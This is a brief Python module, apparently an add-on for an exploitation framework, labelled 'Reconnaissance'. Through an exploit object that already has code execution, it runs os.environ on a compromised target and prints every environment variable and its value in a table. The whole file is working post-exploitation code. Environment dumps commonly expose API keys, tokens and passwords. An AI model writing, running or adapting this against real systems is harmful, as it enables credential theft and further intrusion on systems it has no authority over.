import ast

def run(exploit, param=None):
    print("[*] Addon Started: Reconnaissance")
    result = exploit.execute("__import__('os').environ.copy()")
    try:
        clean_env = result.replace("environ(", "").rstrip(")")
        env_dict = ast.literal_eval(clean_env)
        print("-" * 75)
        print(f"{'VARIABLE':<40} | {'VALUE'}")
        print("-" * 75)
        for key in sorted(env_dict.keys()):
            val = str(env_dict[key])
            display_val = (val[:32] + "..") if len(val) > 34 else val
            print(f"{key:<40} | {display_val}")
    except:
        print(f"[-] Parsing failed. Raw:\n{result}")